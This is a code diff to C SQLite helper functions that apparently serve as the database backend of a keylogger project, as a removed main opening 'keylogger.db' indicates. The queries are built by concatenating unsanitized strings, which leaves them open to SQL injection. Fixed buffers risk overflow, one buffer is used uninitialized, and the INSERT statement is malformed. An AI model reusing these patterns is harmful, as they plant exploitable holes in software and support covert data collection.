@@ -9,7 +9,6 @@ char *itoa(int nb) {
 static int callback(void *data, int argc, char **argv, char **azColName){
   int i;
   (void)data;
-  //fprintf(stderr, "%s: ", (const char*)data);
     for(i=0; i < argc; i++) {
       // (char*)data[i]= argv[i];
       printf("%s= %s\n", azColName[i], argv[i] ? argv[i]: "NULL");
@@ -61,7 +60,7 @@ void get_all_clients(sqlite3 *db) {
 }
 
 void update_data(sqlite3 *db, char *data, int id_client) {
-  char *sql= "UPDATE clients SET data= '";
+  char *sql= "UPDATE data SET data= '";
   char *res;
   if ((res = calloc(1024, sizeof(char))) == NULL)
     return;
@@ -79,27 +78,46 @@ void update_data(sqlite3 *db, char *data, int id_client) {
   free(res);
 }
 
-void add_data(sqlite3 *db, char *data, char *mac_addr) {
-  char *data_callback;
-  char *sql= "SELECT data FROM clients "\
-	      "WHERE mac_addr='";
+void create_data(sqlite3 *db, int id_server, int id_client, char *data) {
+  char *sql= "INSERT INTO data(id_server, id_client, data "\
+	      "VALUES(";
   char *res;
   if ((res = calloc(1024, sizeof(char))) == NULL)
     return;
   strcat(res, sql);
-  strcat(res, mac_addr);
-  strcat(res, "';");
-  
+  strcat(res, itoa(id_server));
+  strcat(res, ", ");
+  strcat(res, itoa(id_client));
+  strcat(res, ", '");
   strcat(res, data);
-  strcat(res, "';");
+  strcat(res, "');");
   printf("%s\n", res);
 
-  if(sqlite3_exec(db, res, callback, &data_callback, 0) != SQLITE_OK)
+  if(sqlite3_exec(db, res, NULL, 0, 0) != SQLITE_OK)
     perror("sqlite error\n");
   else
     printf("add data success\n");
   free(res);
 }
+
+void research_data(sqlite3 *db, int id_client) {
+  char *sql= "SELECT data FROM data"\
+	      " WHERE id_client= ";
+  char *res= malloc(sizeof(char) * 256);
+  strcat(res, sql);
+  strcat(res, itoa(id_client));
+  strcat(res, ";");
+  printf("%s\n", res);
+
+  if(sqlite3_exec(db, res, callback, 0, 0) != SQLITE_OK)
+    perror("sqlite error");
+  else
+    printf("research data success\n");
+  free(res);
+}
+
+/*void concat_data(sqlite3 *db, char *data) {
+}*/
 
 void delete_clients(sqlite3 *db, int id_client) { 
    char *sql= "DELETE FROM clients "\
@@ -115,22 +133,3 @@ void delete_clients(sqlite3 *db, int id_client) {
    else 
    printf("delete success\n"); 
  } 
- 
-/*int main() {
-  sqlite3 *keylogger;
-  int res= sqlite3_open("keylogger.db", &keylogger);
-
-  if(res) {
-    perror("can't succeed\n");
-    exit(0);
-  }
-  else
-    printf("connection success\n");
-  //create_clients(keylogger, 3, "3P.4H.9T.DF.FD.Q7", "nouveau client cree");
-  //research_clients(keylogger, 1);
-  //update_clients(keylogger, "bonjour j'update", 1);
-  //delete_clients(keylogger, "78.4H.9T.DF.T3.Q5");
-  get_all_clients(keylogger);
-  sqlite3_close(keylogger);
-  return 0;
-}*/
